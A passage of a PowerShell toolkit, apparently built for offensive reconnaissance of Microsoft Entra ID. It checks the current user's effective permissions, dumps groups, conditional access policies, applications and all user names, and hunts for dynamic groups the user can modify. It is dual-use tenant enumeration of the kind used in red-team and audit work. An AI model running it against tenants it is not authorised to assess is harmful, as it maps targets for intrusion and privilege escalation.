        "microsoft.directory/directoryRoles/allProperties/allTasks" = "Create and delete directory roles, and read and update all properties"
        "microsoft.directory/directoryRoleTemplates/allProperties/allTasks" = "Create and delete Microsoft Entra role templates, and read and update all properties"
        "microsoft.directory/domains/federationConfiguration/standard/read" = "Read standard properties of federation configuration for domains"
        "microsoft.directory/domains/federationConfiguration/basic/update" = "Update basic federation configuration for domains"
        "microsoft.directory/domains/federationConfiguration/create" = "Create federation configuration for domains"
        "microsoft.directory/domains/federationConfiguration/delete" = "Delete federation configuration for domains"
        "microsoft.directory/entitlementManagement/allProperties/allTasks" = "Create and delete resources, and read and update all properties in Microsoft Entra entitlement management"
        "microsoft.directory/groups/allProperties/allTasks" = "Create and delete groups, and read and update all properties"
        "microsoft.directory/groupsAssignableToRoles/create" = "Create role-assignable groups"
        "microsoft.directory/groupsAssignableToRoles/delete" = "Delete role-assignable groups"
        "microsoft.directory/groupsAssignableToRoles/restore" = "Restore role-assignable groups"
        "microsoft.directory/groupsAssignableToRoles/allProperties/update" = "Update role-assignable groups"
        "microsoft.directory/groupSettings/allProperties/allTasks" = "Create and delete group settings, and read and update all properties"
        "microsoft.directory/groupSettingTemplates/allProperties/allTasks" = "Create and delete group setting templates, and read and update all properties"
        "microsoft.directory/identityProtection/allProperties/allTasks" = "Create and delete all resources, and read and update standard properties in Microsoft Entra ID Protection"
        "microsoft.directory/loginOrganizationBranding/allProperties/allTasks" = "Create and delete loginTenantBranding, and read and update all properties"
        "microsoft.directory/organization/allProperties/allTasks" = "Read and update all properties for an organization"
        "microsoft.directory/policies/allProperties/allTasks" = "Create and delete policies, and read and update all properties"
        "microsoft.directory/conditionalAccessPolicies/allProperties/allTasks" = "Manage all properties of conditional access policies"
        "microsoft.directory/crossTenantAccessPolicy/standard/read" = "Read basic properties of cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/allowedCloudEndpoints/update" = "Update allowed cloud endpoints of cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/basic/update" = "Update basic settings of cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/default/standard/read" = "Read basic properties of the default cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/default/b2bCollaboration/update" = "Update Microsoft Entra B2B collaboration settings of the default cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/default/b2bDirectConnect/update" = "Update Microsoft Entra B2B direct connect settings of the default cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/default/crossCloudMeetings/update" = "Update cross-cloud Teams meeting settings of the default cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/default/tenantRestrictions/update" = "Update tenant restrictions of the default cross-tenant access policy"
        "microsoft.directory/crossTenantAccessPolicy/partners/create" = "Create cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/delete" = "Delete cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/standard/read" = "Read basic properties of cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/b2bCollaboration/update" = "Update Microsoft Entra B2B collaboration settings of cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/b2bDirectConnect/update" = "Update Microsoft Entra B2B direct connect settings of cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/crossCloudMeetings/update" = "Update cross-cloud Teams meeting settings of cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/tenantRestrictions/update" = "Update tenant restrictions of cross-tenant access policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/create" = "Create cross-tenant sync policy for partners"
        "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/basic/update" = "Update basic settings of cross-tenant sync policy"
        "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/standard/read" = "Read basic properties of cross-tenant sync policy"
        "microsoft.directory/privilegedIdentityManagement/allProperties/read" = "Read all resources in Privileged Identity Management"
        "microsoft.directory/resourceNamespaces/resourceActions/authenticationContext/update" = "Update Conditional Access authentication context of Microsoft 365 role-based access control (RBAC) resource actions"
        "microsoft.directory/roleAssignments/allProperties/allTasks" = "Create and delete role assignments, and read and update all role assignment properties"
        "microsoft.directory/roleDefinitions/allProperties/allTasks" = "Create and delete role definitions, and read and update all properties"
        "microsoft.directory/scopedRoleMemberships/allProperties/allTasks" = "Create and delete scopedRoleMemberships, and read and update all properties"
        "microsoft.directory/serviceAction/activateService" = "Can perform the 'activate service' action for a service"
        "microsoft.directory/serviceAction/disableDirectoryFeature" = "Can perform the 'disable directory feature' service action"
        "microsoft.directory/serviceAction/enableDirectoryFeature" = "Can perform the 'enable directory feature' service action"
        "microsoft.directory/serviceAction/getAvailableExtentionProperties" = "Can perform the getAvailableExtentionProperties service action"
        "microsoft.directory/servicePrincipals/allProperties/allTasks" = "Create and delete service principals, and read and update all properties"
        "microsoft.directory/servicePrincipals/managePermissionGrantsForAll.microsoft-company-admin" = "Grant consent for any permission to any application"
        "microsoft.directory/subscribedSkus/allProperties/allTasks" = "Buy and manage subscriptions and delete subscriptions"
        "microsoft.directory/users/allProperties/allTasks" = "Create and delete users, and read and update all properties"
        "microsoft.directory/permissionGrantPolicies/create" = "Create permission grant policies"
        "microsoft.directory/permissionGrantPolicies/delete" = "Delete permission grant policies"
        "microsoft.directory/permissionGrantPolicies/standard/read" = "Read standard properties of permission grant policies"
        "microsoft.directory/permissionGrantPolicies/basic/update" = "Update basic properties of permission grant policies"
        "microsoft.directory/servicePrincipalCreationPolicies/create" = "Create service principal creation policies"
        "microsoft.directory/servicePrincipalCreationPolicies/delete" = "Delete service principal creation policies"
        "microsoft.directory/servicePrincipalCreationPolicies/standard/read" = "Read standard properties of service principal creation policies"
        "microsoft.directory/servicePrincipalCreationPolicies/basic/update" = "Update basic properties of service principal creation policies"
        "microsoft.directory/tenantManagement/tenants/create" = "Create new tenants in Microsoft Entra ID"
        "microsoft.directory/verifiableCredentials/configuration/contracts/cards/allProperties/read" = "Read a verifiable credential card"
        "microsoft.directory/verifiableCredentials/configuration/contracts/cards/revoke" = "Revoke a verifiable credential card"
        "microsoft.directory/verifiableCredentials/configuration/contracts/create" = "Create a verifiable credential contract"
        "microsoft.directory/verifiableCredentials/configuration/contracts/allProperties/read" = "Read a verifiable credential contract"
        "microsoft.directory/verifiableCredentials/configuration/contracts/allProperties/update" = "Update a verifiable credential contract"
        "microsoft.directory/verifiableCredentials/configuration/create" = "Create configuration required to create and manage verifiable credentials"
        "microsoft.directory/verifiableCredentials/configuration/delete" = "Delete configuration required to create and manage verifiable credentials and delete all of its verifiable credentials"
        "microsoft.directory/verifiableCredentials/configuration/allProperties/read" = "Read configuration required to create and manage verifiable credentials"
        "microsoft.directory/verifiableCredentials/configuration/allProperties/update" = "Update configuration required to create and manage verifiable credentials"
        "microsoft.directory/lifecycleWorkflows/workflows/allProperties/allTasks" = "Manage all aspects of lifecycle workflows and tasks in Microsoft Entra ID"
        "microsoft.directory/pendingExternalUserProfiles/create" = "Create external user profiles in the extended directory for Teams"
        "microsoft.directory/pendingExternalUserProfiles/standard/read" = "Read standard properties of external user profiles in the extended directory for Teams"
        "microsoft.directory/pendingExternalUserProfiles/basic/update" = "Update basic properties of external user profiles in the extended directory for Teams"
        "microsoft.directory/pendingExternalUserProfiles/delete" = "Delete external user profiles in the extended directory for Teams"
        "microsoft.directory/externalUserProfiles/standard/read" = "Read standard properties of external user profiles in the extended directory for Teams"
        "microsoft.directory/externalUserProfiles/basic/update" = "Update basic properties of external user profiles in the extended directory for Teams"
        "microsoft.directory/externalUserProfiles/delete" = "Delete external user profiles in the extended directory for Teams"
        "microsoft.azure.advancedThreatProtection/allEntities/allTasks" = "Manage all aspects of Azure Advanced Threat Protection"
        "microsoft.azure.informationProtection/allEntities/allTasks" = "Manage all aspects of Azure Information Protection"
        "microsoft.commerce.billing/allEntities/allProperties/allTasks" = "Manage all aspects of Office 365 billing"
        "microsoft.commerce.billing/purchases/standard/read" = "Read purchase services in M365 Admin Center."
        "microsoft.dynamics365/allEntities/allTasks" = "Manage all aspects of Dynamics 365"
        "microsoft.edge/allEntities/allProperties/allTasks" = "Manage all aspects of Microsoft Edge"
        "microsoft.networkAccess/allEntities/allProperties/allTasks" = "Manage all aspects of Entra Network Access"
        "microsoft.flow/allEntities/allTasks" = "Manage all aspects of Microsoft Power Automate"
        "microsoft.hardware.support/shippingAddress/allProperties/allTasks" = "Create, read, update, and delete shipping addresses for Microsoft hardware warranty claims, including shipping addresses created by others"
        "microsoft.hardware.support/shippingStatus/allProperties/read" = "Read shipping status for open Microsoft hardware warranty claims"
        "microsoft.hardware.support/warrantyClaims/allProperties/allTasks" = "Create and manage all aspects of Microsoft hardware warranty claims"
        "microsoft.insights/allEntities/allProperties/allTasks" = "Manage all aspects of Insights app"
        "microsoft.intune/allEntities/allTasks" = "Manage all aspects of Microsoft Intune"
        "microsoft.office365.complianceManager/allEntities/allTasks" = "Manage all aspects of Office 365 Compliance Manager"
        "microsoft.office365.desktopAnalytics/allEntities/allTasks" = "Manage all aspects of Desktop Analytics"
        "microsoft.office365.knowledge/contentUnderstanding/allProperties/allTasks" = "Read and update all properties of content understanding in Microsoft 365 admin center"
        "microsoft.office365.knowledge/contentUnderstanding/analytics/allProperties/read" = "Read analytics reports of content understanding in Microsoft 365 admin center"
        "microsoft.office365.knowledge/knowledgeNetwork/allProperties/allTasks" = "Read and update all properties of knowledge network in Microsoft 365 admin center"
        "microsoft.office365.knowledge/knowledgeNetwork/topicVisibility/allProperties/allTasks" = "Manage topic visibility of knowledge network in Microsoft 365 admin center"
        "microsoft.office365.knowledge/learningSources/allProperties/allTasks" = "Manage learning sources and all their properties in Learning App."
        "microsoft.office365.lockbox/allEntities/allTasks" = "Manage all aspects of Customer Lockbox"
        "microsoft.office365.messageCenter/messages/read" = "Read messages in Message Center in the Microsoft 365 admin center, excluding security messages"
        "microsoft.office365.messageCenter/securityMessages/read" = "Read security messages in Message Center in the Microsoft 365 admin center"
        "microsoft.office365.organizationalMessages/allEntities/allProperties/allTasks" = "Manage all authoring aspects of Microsoft 365 admin center communications"
        "microsoft.office365.organizationalMessages/templates/allProperties/allTasks" = "Manage all authoring aspects of Microsoft 365 admin center communications templates"
        "microsoft.office365.organizationalMessages/allEntities/allTasks" = "Manage all aspects of Microsoft 365 admin center communications"
        "microsoft.office365.organizationalMessages/templates/allTasks" = "Manage all aspects of Microsoft 365 admin center communications templates"
        "microsoft.office365.powerPlatform/allEntities/allTasks" = "Manage all aspects of Power Platform"
        "microsoft.office365.securityComplianceCenter/allEntities/allProperties/allTasks" = "Manage all aspects of Office 365 Security & Compliance Center"
        "microsoft.directory/accessReviews/allProperties/read" = "(Deprecated) Read all properties of access reviews"
        "microsoft.directory/accessReviews/definitions/allProperties/read" = "Read all properties of access reviews of all reviewable resources in Microsoft Entra ID"
        "microsoft.directory/adminConsentRequestPolicy/allProperties/read" = "Read all properties of admin consent request policies in Microsoft Entra ID"
        "microsoft.directory/administrativeUnits/allProperties/read" = "Read all properties of administrative units, including members"
        "microsoft.directory/applications/allProperties/read" = "Read all properties (including privileged properties) on all types of applications"
        "microsoft.directory/users/authenticationMethods/standard/restrictedRead" = "Read standard properties of authentication methods that do not include personally identifiable information for users"
        "microsoft.directory/cloudAppSecurity/allProperties/read" = "Read all properties for Defender for Cloud Apps"
        "microsoft.directory/contacts/allProperties/read" = "Read all properties for contacts"
        "microsoft.directory/customAuthenticationExtensions/allProperties/read" = "Read custom authentication extensions"
        "microsoft.directory/deviceLocalCredentials/standard/read" = "Read all properties of the backed up local administrator account credentials for Microsoft Entra joined devices, except the password"
        "microsoft.directory/devices/allProperties/read" = "Read all properties of devices"
        "microsoft.directory/directoryRoles/allProperties/read" = "Read all properties of directory roles"
        "microsoft.directory/directoryRoleTemplates/allProperties/read" = "Read all properties of directory role templates"
        "microsoft.directory/domains/allProperties/read" = "Read all properties of domains"
        "microsoft.directory/entitlementManagement/allProperties/read" = "Read all properties in Microsoft Entra entitlement management"
        "microsoft.directory/groups/allProperties/read" = "Read all properties (including privileged properties) on Security groups and Microsoft 365 groups, including role-assignable groups"
        "microsoft.directory/groupSettings/allProperties/read" = "Read all properties of group settings"
        "microsoft.directory/groupSettingTemplates/allProperties/read" = "Read all properties of group setting templates"
        "microsoft.directory/identityProtection/allProperties/read" = "Read all resources in Microsoft Entra ID Protection"
        "microsoft.directory/loginOrganizationBranding/allProperties/read" = "Read all properties for your organization's branded sign-in page"
        "microsoft.directory/oAuth2PermissionGrants/allProperties/read" = "Read all properties of OAuth 2.0 permission grants"
        "microsoft.directory/organization/allProperties/read" = "Read all properties for an organization"
        "microsoft.directory/policies/allProperties/read" = "Read all properties of policies"
        "microsoft.directory/conditionalAccessPolicies/allProperties/read" = "Read all properties of conditional access policies"
        "microsoft.directory/roleAssignments/allProperties/read" = "Read all properties of role assignments"
        "microsoft.directory/roleDefinitions/allProperties/read" = "Read all properties of role definitions"
        "microsoft.directory/scopedRoleMemberships/allProperties/read" = "View members in administrative units"
        "microsoft.directory/servicePrincipals/allProperties/read" = "Read all properties (including privileged properties) on servicePrincipals"
        "microsoft.directory/subscribedSkus/allProperties/read" = "Read all properties of product subscriptions"
        "microsoft.directory/users/allProperties/read" = "Read all properties of users"
        "microsoft.directory/lifecycleWorkflows/workflows/allProperties/read" = "Read all properties of lifecycle workflows and tasks in Microsoft Entra ID"
        "microsoft.cloudPC/allEntities/allProperties/read" = "Read all aspects of Windows 365"
        "microsoft.commerce.billing/allEntities/allProperties/read" = "Read all resources of Office 365 billing"
        "microsoft.edge/allEntities/allProperties/read" = "Read all aspects of Microsoft Edge"
        "microsoft.networkAccess/allEntities/allProperties/read" = "Read all aspects of Entra Network Access"
        "microsoft.hardware.support/shippingAddress/allProperties/read" = "Read shipping addresses for Microsoft hardware warranty claims, including existing shipping addresses created by others"
        "microsoft.hardware.support/warrantyClaims/allProperties/read" = "Read Microsoft hardware warranty claims"
        "microsoft.insights/allEntities/allProperties/read" = "Read all aspects of Viva Insights"
        "microsoft.office365.organizationalMessages/allEntities/allProperties/read" = "Read all aspects of Microsoft 365 Organizational Messages"
        "microsoft.office365.protectionCenter/allEntities/allProperties/read" = "Read all properties in the Security and Compliance centers"
        "microsoft.office365.securityComplianceCenter/allEntities/read" = "Read standard properties in Microsoft 365 Security and Compliance Center"
        "microsoft.office365.yammer/allEntities/allProperties/read" = "Read all aspects of Yammer"
        "microsoft.permissionsManagement/allEntities/allProperties/read" = "Read all aspects of Entra Permissions Management"
        "microsoft.teams/allEntities/allProperties/read" = "Read all properties of Microsoft Teams"
        "microsoft.virtualVisits/allEntities/allProperties/read" = "Read all aspects of Virtual Visits"
        "microsoft.viva.goals/allEntities/allProperties/read" = "Read all aspects of Microsoft Viva Goals"
        "microsoft.viva.pulse/allEntities/allProperties/read" = "Read all aspects of Microsoft Viva Pulse"
        "microsoft.windows.updatesDeployments/allEntities/allProperties/read" = "Read all aspects of Windows Update Service"
    }

    $allowedActions = @()
    $conditionalActions = @()
    $otherActions = @()

    $keys = $resourceActions.Keys
    $batchSize = 10
    $batches = [math]::Ceiling($keys.Count / $batchSize)

    for ($i = 0; $i -lt $batches; $i++) {
        $batch = $keys | Select-Object -Skip ($i * $batchSize) -First $batchSize

        $body = @{
            resourceActionAuthorizationChecks = $batch | ForEach-Object {
                @{directoryScopeId = "/$userId"; resourceAction = $_ }
            }
        } | ConvertTo-Json -Depth 3 -Compress

        try {
            $response = Invoke-MgGraphRequest -Method POST -Uri $estimateAccessUri -Body $body -ContentType "application/json"

            foreach ($entry in $response.value) {
                switch ($entry.accessDecision) {
                    "allowed" { $allowedActions += $resourceActions[$entry.resourceAction] }
                    "conditional" { $conditionalActions += $resourceActions[$entry.resourceAction] }
                    default { $otherActions += "$($resourceActions[$entry.resourceAction]) : $($entry.accessDecision)" }
                }
            }
        } catch {
            Write-Host "[-] Error estimating permissions for batch $($i): $($_.Exception.Message)"
        }
    }

    Write-Host "`n[+] Allowed Actions (Summaries):"
    if ($allowedActions) { $allowedActions | Sort-Object | Get-Unique | ForEach-Object { Write-Host "    $_" } } else { Write-Host "    None" }

    Write-Host "`n[+] Conditional Access Actions (May Work Under Certain Conditions) (Summaries):"
    if ($conditionalActions) { $conditionalActions | Sort-Object | Get-Unique | ForEach-Object { Write-Host "    $_" } } else { Write-Host "    None" }

    Write-Host "`n[+] Other Actions (Denied or Unclear) (Summaries):"
    if ($otherActions) { $otherActions | Sort-Object | Get-Unique | ForEach-Object { Write-Host "    $_" } } else { Write-Host "    None" }

    Write-Host "`n[*] Recon Completed."
}

function Get-SecurityGroups {
    <#
    .SYNOPSIS
        Retrieve security groups and their members using Microsoft.Graph PowerShell SDK v2.
    .DESCRIPTION
        Uses the Microsoft.Graph PowerShell SDK v2 (2.25.0) to fetch security groups and their members.
    .PARAMETER OutputFile
        Path to export the security groups to a CSV file.
    .EXAMPLE
        Get-SecurityGroups -OutputFile "security_groups.csv"
    #>

    param (
        [Parameter(Mandatory = $false)]
        [string] $OutputFile = "security_groups.csv"
    )

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Write-Host -ForegroundColor Yellow "[*] Connecting to Microsoft Graph..."
        Connect-Graph
    }

    Write-Host -ForegroundColor Yellow "[*] Fetching security groups..."

    # Retrieve security groups
    $groups = Get-MgGroup -Filter "securityEnabled eq true" -All

    if (-not $groups) {
        Write-Host -ForegroundColor Red "[*] No security groups found."
        return
    }

    $groupData = @()

    foreach ($group in $groups) {
        Write-Host -ForegroundColor Cyan "[*] Processing group: $($group.DisplayName) ($($group.Id))"

        # Retrieve members of the group
        $members = Get-MgGroupMember -GroupId $group.Id -All

        # Extract UserPrincipalName if the member is a user, otherwise use DisplayName
        $memberList = @()
        foreach ($member in $members) {
            if ($member.'@odata.type' -eq "#microsoft.graph.user") {
                $memberList += $member.UserPrincipalName
            } elseif ($member.DisplayName) {
                $memberList += $member.DisplayName
            } else {
                $memberList += $member.Id  # Fallback to ID if no other properties are available
            }
        }

        $groupInfo = [PSCustomObject]@{
            GroupName  = $group.DisplayName
            GroupId    = $group.Id
            Members    = $memberList -join ", "
        }

        $groupData += $groupInfo
    }

    if ($OutputFile) {
        $groupData | Export-Csv -Path $OutputFile -NoTypeInformation
        Write-Host -ForegroundColor Green "[*] Security groups exported to $OutputFile."
    }

    return $groupData
}


Function Invoke-DumpCAPS {
    <#
    .SYNOPSIS
        Dump Conditional Access Policies using Microsoft Graph SDK v2.
    .DESCRIPTION
        Fetches Conditional Access Policies from Microsoft Graph.
    .PARAMETER ResolveGuids
        Resolves GUIDs for user and group conditions.
    #>

    Param(
        [switch]$ResolveGuids
    )

    # Ensure the required module is imported
    if (-not (Get-Module -Name Microsoft.Graph.Identity.SignIns -ListAvailable)) {
        Write-Host "[-] Missing Microsoft.Graph.Identity.SignIns module. Installing..."
        Install-Module Microsoft.Graph.Identity.SignIns -Scope CurrentUser -Force
    }
    Import-Module Microsoft.Graph.Identity.SignIns

    # Ensure connection is established
    if (-not (Get-MgContext)) {
        try {
            Connect-Graph
        } catch {
            Write-Host "[-] Failed to connect to Microsoft Graph: $($_.Exception.Message)"
            return
        }
    }

    Write-Host "[*] Fetching Conditional Access Policies..."

    try {
        $policies = Get-MgIdentityConditionalAccessPolicy
    } catch {
        Write-Host "[-] Failed to retrieve Conditional Access Policies: $($_.Exception.Message)"
        return
    }

    if (-not $policies) {
        Write-Host "[!] No Conditional Access Policies found."
        return
    }

    foreach ($policy in $policies) {
        Write-Host ("=" * 80)
        Write-Host "Display Name: $($policy.DisplayName)"
        Write-Host "State: $($policy.State)"
        Write-Host "Conditions:"

        # Applications
        if ($policy.Conditions.Applications.IncludeApplications -or $policy.Conditions.Applications.ExcludeApplications) {
            Write-Host "`tApplications:"
            if ($policy.Conditions.Applications.IncludeApplications) {
                Write-Host "`t`tInclude: $($policy.Conditions.Applications.IncludeApplications -join ', ')"
            }
            if ($policy.Conditions.Applications.ExcludeApplications) {
                Write-Host "`t`tExclude: $($policy.Conditions.Applications.ExcludeApplications -join ', ')"
            }
        }

        # Users and Groups
        if ($policy.Conditions.Users.IncludeUsers -or $policy.Conditions.Users.ExcludeUsers -or $policy.Conditions.Users.IncludeGroups -or $policy.Conditions.Users.ExcludeGroups) {
            Write-Host "`tUsers and Groups:"
            if ($policy.Conditions.Users.IncludeUsers) {
                $resolvedUsers = if ($ResolveGuids) { $policy.Conditions.Users.IncludeUsers -join ', ' } else { $policy.Conditions.Users.IncludeUsers -join ', ' }
                Write-Host "`t`tInclude Users: $resolvedUsers"
            }
            if ($policy.Conditions.Users.ExcludeUsers) {
                Write-Host "`t`tExclude Users: $($policy.Conditions.Users.ExcludeUsers -join ', ')"
            }
            if ($policy.Conditions.Users.IncludeGroups) {
                Write-Host "`t`tInclude Groups: $($policy.Conditions.Users.IncludeGroups -join ', ')"
            }
            if ($policy.Conditions.Users.ExcludeGroups) {
                Write-Host "`t`tExclude Groups: $($policy.Conditions.Users.ExcludeGroups -join ', ')"
            }
        }

        # Platforms
        if ($policy.Conditions.Platforms.IncludePlatforms -or $policy.Conditions.Platforms.ExcludePlatforms) {
            Write-Host "`tPlatforms:"
            if ($policy.Conditions.Platforms.IncludePlatforms) {
                Write-Host "`t`tInclude: $($policy.Conditions.Platforms.IncludePlatforms -join ', ')"
            }
            if ($policy.Conditions.Platforms.ExcludePlatforms) {
                Write-Host "`t`tExclude: $($policy.Conditions.Platforms.ExcludePlatforms -join ', ')"
            }
        }

        # Grant Controls
        Write-Host "Controls:"
        if ($policy.GrantControls.BuiltInControls) {
            Write-Host "`tGrant Controls: $($policy.GrantControls.BuiltInControls -join ', ')"
        }
        if ($policy.SessionControls.ApplicationEnforcedRestrictions) {
            Write-Host "`tSession Controls: Application Enforced Restrictions Enabled"
        }
        if ($policy.SessionControls.CloudAppSecurity) {
            Write-Host "`tSession Controls: Cloud App Security - $($policy.SessionControls.CloudAppSecurity)"
        }
        if ($policy.SessionControls.SignInFrequency) {
            Write-Host "`tSession Controls: Sign-In Frequency - $($policy.SessionControls.SignInFrequency.Value) $($policy.SessionControls.SignInFrequency.Type)"
        }

        Write-Host ("=" * 80)
    }
}

Function Invoke-DumpApps {
    <#
    .SYNOPSIS
        Dumps App Registrations, Enterprise Apps, and permissions granted by users.
    .DESCRIPTION
        Uses Microsoft.Graph PowerShell SDK v2 (2.25.0) to enumerate Azure AD applications and service principals.
    .PARAMETER Tokens
        (Optional) Provide access tokens if available.
    .PARAMETER GraphRun
        (Optional) Used internally when called from other scripts.
    #>

    Param(
        [object[]]$Tokens = "",
        [switch]$GraphRun
    )

    # Import Required Graph Submodules
    $requiredModules = @(
        'Microsoft.Graph.Applications',
        'Microsoft.Graph.Identity.DirectoryManagement'
    )

    foreach ($module in $requiredModules) {
        if (-not (Get-Module -Name $module -ListAvailable)) {
            Write-Host "[-] Missing $module module. Installing..."
            Install-Module -Name $module -Scope CurrentUser -Force
        }
        Import-Module $module
    }

    # Authenticate via Connect-MgGraph if no token is provided
    if (-not $Tokens) {
        if (-not (Get-MgContext)) {
            Write-Host "[*] Connecting to Microsoft Graph..."
            try {
                Connect-Graph
            } catch {
                Write-Host "[-] Authentication Failed: $($_.Exception.Message)"
                return
            }
        }
    } else {
        Write-Host "[*] Using provided access tokens. Token-based auth not integrated here (manual override assumed)."
    }

    Write-Host "[*] Retrieving App Registrations..."
    $appRegistrations = Get-MgApplication -All

    Write-Host ("=" * 80)
    foreach ($app in $appRegistrations) {
        Write-Host "App Registration: $($app.DisplayName)"
        Write-Host "App ID: $($app.AppId)"
        Write-Host "Object ID: $($app.Id)"
        Write-Host "Sign-In Audience: $($app.SignInAudience)"
        Write-Host "Created: $($app.CreatedDateTime)"

        # Required Permissions (RequiredResourceAccess)
        if ($app.RequiredResourceAccess) {
            Write-Host "Required Permissions:"
            foreach ($resourceAccess in $app.RequiredResourceAccess) {
                $servicePrincipal = Get-MgServicePrincipal -Filter "appId eq '$($resourceAccess.ResourceAppId)'" -ErrorAction SilentlyContinue
                $appName = if ($servicePrincipal) { $servicePrincipal.DisplayName } else { $resourceAccess.ResourceAppId }

                $delegatedScopes = $resourceAccess.ResourceAccess | Where-Object { $_.Type -eq "Scope" } | ForEach-Object { $_.Id }
                $appRoles = $resourceAccess.ResourceAccess | Where-Object { $_.Type -eq "Role" } | ForEach-Object { $_.Id }

                Write-Host "  - Resource: $appName"

                if ($delegatedScopes) {
                    Write-Host "    Delegated Permissions:"
                    foreach ($scopeId in $delegatedScopes) {
                        $scopeName = $servicePrincipal.Oauth2PermissionScopes | Where-Object { $_.Id -eq $scopeId } | Select-Object -ExpandProperty Value
                        Write-Host "      - $scopeName"
                    }
                }

                if ($appRoles) {
                    Write-Host "    Application Permissions:"
                    foreach ($roleId in $appRoles) {
                        $roleName = $servicePrincipal.AppRoles | Where-Object { $_.Id -eq $roleId } | Select-Object -ExpandProperty Value
                        Write-Host "      - $roleName"
                    }
                }
            }
        } else {
            Write-Host "No Required Permissions."
        }
        Write-Host ("=" * 80)
    }

    Write-Host "[*] Retrieving Enterprise Apps (Service Principals)..."
    $servicePrincipals = Get-MgServicePrincipal -All

    foreach ($sp in $servicePrincipals) {
        Write-Host "Enterprise App: $($sp.DisplayName)"
        Write-Host "App ID: $($sp.AppId)"
        Write-Host "Object ID: $($sp.Id)"
        Write-Host "Created: $($sp.CreatedDateTime)"
        Write-Host "Publisher: $($sp.AppOwnerOrganizationId)"

        # Retrieve App Role Assignments (Consents)
        $appRoleAssignments = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $sp.Id -ErrorAction SilentlyContinue
        if ($appRoleAssignments) {
            Write-Host "App Role Assignments (Consented Users/Groups):"
            foreach ($assignment in $appRoleAssignments) {
                Write-Host "  - Principal: $($assignment.PrincipalDisplayName) (ID: $($assignment.PrincipalId))"
                Write-Host "    App Role: $($assignment.AppRoleId)"
            }
        } else {
            Write-Host "No App Role Assignments found."
        }

        Write-Host ("=" * 80)
    }

    Write-Host "[*] Enumeration Completed."
}


Function Get-AzureADUsers {
    <#
    .SYNOPSIS
        Gather the full list of users from the directory (Microsoft Entra ID) using MgGraph SDK.
    .DESCRIPTION
        Retrieves all users from Entra ID (Azure AD) using Microsoft.Graph PowerShell SDK v2.
    .PARAMETER OutFile
        File to output the list of userPrincipalNames.
    .EXAMPLE
        Get-AzureADUsers -OutFile users.txt
    #>

    param(
        [Parameter(Mandatory = $false)]
        [string]
        $OutFile = "users.txt"
    )

    # Import Required Module
    $requiredModule = 'Microsoft.Graph.Users'
    if (-not (Get-Module -Name $requiredModule -ListAvailable)) {
        Write-Host "[-] Missing $requiredModule module. Installing..."
        Install-Module -Name $requiredModule -Scope CurrentUser -Force
    }
    Import-Module $requiredModule

    # Authenticate if not already connected
    if (-not (Get-MgContext)) {
        Write-Host "[*] Connecting to Microsoft Graph..."
        try {
            Connect-Graph
        } catch {
            Write-Host "[-] Authentication Failed: $($_.Exception.Message)"
            return
        }
    }

    Write-Host "[*] Fetching Users from Microsoft Entra ID (Azure AD)..."

    # Fetch all users
    try {
        $users = Get-MgUser -All -Property UserPrincipalName
        $userPrincipalNames = $users | Select-Object -ExpandProperty UserPrincipalName

        # Output results
        $userPrincipalNames | Out-File -Encoding ASCII -FilePath $OutFile

        Write-Host "[+] Retrieved $($userPrincipalNames.Count) users. Saved to $OutFile"
    } catch {
        Write-Host "[-] Failed to retrieve users: $($_.Exception.Message)"
    }
}

function Get-DynamicGroups {
    <#
        .SYNOPSIS
            Finds groups that use dynamic membership and checks EstimateAccess permissions.
        .DESCRIPTION
            Retrieves all groups, filters for dynamic membership locally, checks EstimateAccess permissions, and outputs results to console (grouped by access decision) and CSV.
        .EXAMPLES
            PS> Get-DynamicGroups -OutputPath "DynamicGroups.csv"
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $false)]
        [object[]]$Tokens = "",
        [Parameter(Position = 1, Mandatory = $false)]
        [string]$OutputPath = "DynamicGroups.csv"
    )

    # Connect to Graph if not already connected
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    Write-Host -ForegroundColor Yellow "[*] Fetching ALL Groups (local filter for dynamic membership)..."

    $results = @()
    $groups = @()

    try {
        # Get all groups, including membershipRule for filtering locally
        $groups = Get-MgGroup -All -Property "id,displayName,description,isAssignableToRole,onPremisesSyncEnabled,mail,createdDateTime,visibility,membershipRule,membershipRuleProcessingState"
    } catch {
        Write-Host -ForegroundColor Red "[-] Error fetching groups: $($_.Exception.Message)"
        return
    }

    # Filter only dynamic groups (local filtering because Graph filter is unsupported)
    $dynamicGroups = $groups | Where-Object { $_.membershipRule -ne $null }

    if (-not $dynamicGroups) {
        Write-Host -ForegroundColor Yellow "[*] No Dynamic Groups Found."
        return
    }

    $batchSize = 10
    $estimateAccessUri = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"

    $total = $dynamicGroups.Count
    $counter = 0

    Write-Host -ForegroundColor Yellow "[*] Checking access permissions for each dynamic group using EstimateAccess..."

    for ($i = 0; $i -lt $total; $i += $batchSize) {
        $batch = $dynamicGroups[$i..($i + $batchSize - 1)] | Where-Object { $_ -ne $null }

        $body = @{
            resourceActionAuthorizationChecks = $batch | ForEach-Object {
                @{
                    directoryScopeId = "/$($_.Id)"
                    resourceAction    = "microsoft.directory/groups/members/update"
                }
            }
        } | ConvertTo-Json -Depth 3 -Compress

        try {
            $response = Invoke-MgGraphRequest -Method POST -Uri $estimateAccessUri -Body $body -ContentType "application/json"

            for ($j = 0; $j -lt $batch.Count; $j++) {
                $group = $batch[$j]
                $accessDecision = $response.value[$j].accessDecision

                $results += [PSCustomObject]@{
